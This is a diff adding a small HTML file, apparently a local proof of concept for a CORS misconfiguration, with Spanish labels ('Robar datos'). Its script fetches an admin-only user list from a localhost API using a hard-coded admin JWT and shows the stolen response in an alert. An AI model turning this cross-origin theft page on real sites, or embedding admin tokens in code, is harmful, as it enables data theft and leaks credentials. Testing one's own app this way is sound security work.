@@ -1,0 +1,22 @@
+<!-- test-cors.html -->
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Exploit CORS</h1>
+    <button onclick="stealData()">Robar datos</button>
+
+    <script>
+      async function stealData() {
+        const res = await fetch('http://localhost:3000/api/users/all', {
+          method: 'GET',
+          headers: {
+            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY3ZmNiYjg2MDRmOWRmNGZhZDY5ZWU4YyIsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoiQURNSU4iLCJpYXQiOjE3NDQ2MjI4NjEsImV4cCI6MTc0NTIyNzY2MX0._V4Sw1Fxf3CB7HrTPuuSEehJEqmNr3Fx3W6y83Hv064'
+          }
+        });
+
+        const data = await res.text();
+        alert('Datos robados:\n' + data);
+      }
+    </script>
+  </body>
+</html>
